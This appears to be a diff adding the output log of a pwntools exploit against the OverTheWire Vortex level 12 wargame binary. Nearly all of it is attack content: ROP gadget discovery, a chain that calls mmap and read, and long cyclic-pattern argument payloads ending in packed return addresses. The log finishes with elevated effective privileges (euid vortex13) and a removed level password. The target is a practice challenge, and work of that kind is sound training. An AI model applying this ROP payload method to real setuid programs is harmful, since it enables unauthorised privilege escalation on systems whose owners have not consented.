@@ -1,0 +1,63 @@
+[+] Connecting to vortex.labs.overthewire.org on port 22: OK
+[*] Working directory: '/tmp/tmp.i6ZUArjdcm'
+[*] Uploading 'r.sh' to '/tmp/tmp.i6ZUArjdcm/r.sh'
+[+] Found '/vortex/vortex12' in ssh cache
+[+] Found '/lib/ld-linux.so.2' in ssh cache
+[+] Found '/lib32/libc.so.6' in ssh cache
+[+] Found '/lib32/libpthread.so.0' in ssh cache
+[+] Opening new channel: 'gdb --args /vortex/vortex12': OK
+[*] Closed SSH channel with vortex.labs.overthewire.org
+[*] 0xf7fdc000 ld-linux.so.2
+[*] 0xf7e10000 libc.so.6
+[*] 0xf7fb7000 libpthread.so.0
+[*] 0x8048000 vortex12
+[*] Found gadgets for '/home/user/gist/level12/vortex.labs.overthewire.org/lib/ld-linux.so.2' in cache '/tmp/user/pwntools-rop-cache/ld-linux.so.2-e0c00ad239
+    dd11b4ed81024de5edd5fc-0xf7fdc000'
+[*] Found gadgets for '/home/user/gist/level12/vortex.labs.overthewire.org/lib32/libc.so.6' in cache '/tmp/user/pwntools-rop-cache/libc.so.6-9c8f19d9b0cf8d37
+    03f76e4d2c95ceb0-0xf7e10000'
+[*] Found gadgets for '/home/user/gist/level12/vortex.labs.overthewire.org/lib32/libpthread.so.0' in cache '/tmp/user/pwntools-rop-cache/libpthread.so.0-3a1e
+    9e4fba53462c1b39f6cc352dc0a6-0xf7fb7000'
+[*] Found gadgets for '/vortex/vortex12' in cache '/tmp/user/pwntools-rop-cache/vortex12-2e7834a5d54c95bed068c811be361b90-0x8048000'
+[*] ROP Chain
+    6876fbf7       0xf7fb7668 ret
+    f0beeff7       0xf7efbef0 mmap
+    e13ffcf7       0xf7fc3fe1 add esp, 0xc; pop ebx; pop edi; pop esi; ret
+    0df0d0ba       0xbad0f00d
+    00100000           0x1000
+    07000000              0x7
+    22000000             0x22
+    ffffffff       0xffffffff
+    00000000              0x0
+    60faeef7       0xf7eefa60 __read
+    0df0d0ba       0xbad0f00d
+    00000000              0x0
+    0df0d0ba       0xbad0f00d
+    00100000           0x1000
+    00000000              0x0
+[+] Opening new channel: 'bash r.sh gdb --args /vortex/vortex12 $\'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa
+aaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaa
+cmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaae
+baaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafp
+aafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaahea
+ahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaa
+itaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaak
+STAK\\xc1\\x85\\x04\\x08\' XYZ $\'hv\\xfb\\xf7\\xf0\\xbe\\xef\\xf7\\xe1?\\xfc\\xf7\\r\\xf0\\xd0\\xba\\x00\' $\'\\x10\\x00\' $\'\\x00\' $\'\\x07\\x00\' $\'\\x
+00\' $\'\\x00\' $\'"\\x00\' $\'\\x00\' $\'\\x00\' $\'\\xff\\xff\\xff\\xff\\x00\' $\'\\x00\' $\'\\x00\' $\'\\x00\' $\'`\\xfa\\xee\\xf7\\r\\xf0\\xd0\\xba\\x00\
+' $\'\\x00\' $\'\\x00\' $\'\\x00\' $\'\\r\\xf0\\xd0\\xba\\x00\' $\'\\x10\\x00\' $\'\\x00\' $\'\\x00\' $\'\\x00\' $\'\\x00\' $\'\\x00\'': OK
+[*] Closed SSH channel with vortex.labs.overthewire.org
+[*] 0xffffd960 stack @ return
+[*]    0x582 offset
+[*] 0xffffdee0 stack (aligned)
+[*] ffffdee0 stack
+[+] Opening new channel: 'bash ./r.sh /vortex/vortex12 $\'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaa
+azaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac
+oaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaed
+aaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafra
+afsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaa
+hhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaai
+vaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaak\\xe0\\xd
+e\\xff\\xff\\xc1\\x85\\x04\\x08\' XYZ $\'hv\\xfb\\xf7\\xf0\\xbe\\xef\\xf7\\xe1?\\xfc\\xf7\\r\\xf0\\xd0\\xba\\x00\' $\'\\x10\\x00\' $\'\\x00\' $\'\\x07\\x00\'
+ $\'\\x00\' $\'\\x00\' $\'"\\x00\' $\'\\x00\' $\'\\x00\' $\'\\xff\\xff\\xff\\xff\\x00\' $\'\\x00\' $\'\\x00\' $\'\\x00\' $\'`\\xfa\\xee\\xf7\\r\\xf0\\xd0\\xb
+a\\x00\' $\'\\x00\' $\'\\x00\' $\'\\x00\' $\'\\r\\xf0\\xd0\\xba\\x00\' $\'\\x10\\x00\' $\'\\x00\' $\'\\x00\' $\'\\x00\' $\'\\x00\' $\'\\x00\'@@@@@@': OK
+[+] id: uid=5012(vortex12) gid=5012(vortex12) euid=5013(vortex13) groups=5013(vortex13),5012(vortex12)
+[+] password: <removed>
